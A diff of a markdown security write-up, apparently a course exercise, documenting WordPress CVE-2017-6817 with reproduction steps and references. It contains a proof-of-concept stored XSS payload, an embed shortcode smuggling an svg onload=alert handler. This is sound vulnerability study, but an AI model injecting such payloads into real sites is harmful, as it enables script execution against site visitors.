@@ -19,12 +19,12 @@ Time spent: 10 hours spent in total
    - 1. Log into WP as admin
    - 2. Create a new post 
    - 3. Edit as text and put: 
-          - Here is the YouTube link: [embed src='http://youtube.com/embed/12345\x3csvg onload=alert(12345)\x3e'][/embed]     
+    - [ ] Here is the YouTube link: [embed src='http://youtube.com/embed/12345\x3csvg onload=alert(12345)\x3e'][/embed]     
 - [ ] Affected source code:
   - [Affected source code](https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8)
 - [ ] References:
   - [CVE-2017-6817](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6817)
-   https://core.trac.wordpress.org/browser/branches/4.1/src/wp-includes/class-wp-embed.php
+  - [Reference](https://core.trac.wordpress.org/browser/branches/4.1/src/wp-includes/class-wp-embed.php)
 
 ### 2. (Required) Vulnerability Name or ID
 
